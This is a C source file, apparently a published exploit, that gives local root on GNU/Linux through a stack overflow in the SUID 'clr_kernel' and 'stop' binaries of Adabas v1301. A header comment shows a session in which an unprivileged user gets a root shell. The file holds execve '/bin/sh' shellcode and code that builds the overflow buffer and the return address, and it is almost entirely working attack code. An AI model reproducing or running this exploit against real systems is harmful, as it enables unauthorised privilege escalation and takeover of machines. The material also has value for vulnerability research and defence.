/* GNU/Linux adabas v1301 universal local root exploit
 * ===================================================
 * Standard stack overflow in the command line arguements
 * of SUID root(default) clr_kernel & stop bins. The
 * exploit calculates the value to use for return address.
 *
 * Example use.
 *
 *  matt@debian:/adabas/aad/v1301/pgm$ id
 *  uid=1001(matt) gid=1001(matt) groups=1001(matt),100(users)
 *  matt@debian:/adabas/aad/v1301/pgm$ ./exploit ./stop
 *  [ GNU/Linux adabas v1301 universal local root exploit
 *  [ Using return address 0xbfffffd1
 *  sh-2.05a# id
 *  uid=1001(matt) gid=1001(matt) euid=0(root) groups=1001(matt),100(users)
 *
 * greets to kokanin my DTORS friend for showing me this bug.
 *
 *  - prdelka
 */
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x31\xc0\x50\x68""//sh""\x68""/bin""\x89\xe3"
                 "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc,char* argv[])
{
        printf("[ GNU/Linux adabas v1301 universal local root exploit\n");
        if(argc < 2)
        {
                printf("Error: [path]\n");
                exit(0);
        }
        long eip = 0x41414141;
        char* buffer = malloc(50 + sizeof(eip) + strlen(shellcode));
        int i;
        long ptr = (long)buffer;
        strncat(buffer," ",1);
        for(i = 1;i <= 50;i++)
        {
                strncat(buffer,"A",1);
        }
        ptr = ptr + 50;
        memcpy((char*)ptr,(char*)&eip,4);
        strncat(buffer,shellcode,strlen(shellcode));
        eip = 0xc0000000 -4 -strlen(argv[1]) -1 -strlen(shellcode) -1;
        memcpy((char*)ptr,(char*)&eip,4);
        char *env[] = {"DBROOT=heh",NULL};
        printf("[ Using return address 0x%x\n",eip);
        execle(argv[1],argv[1],buffer,NULL,env);
        exit(0);
}
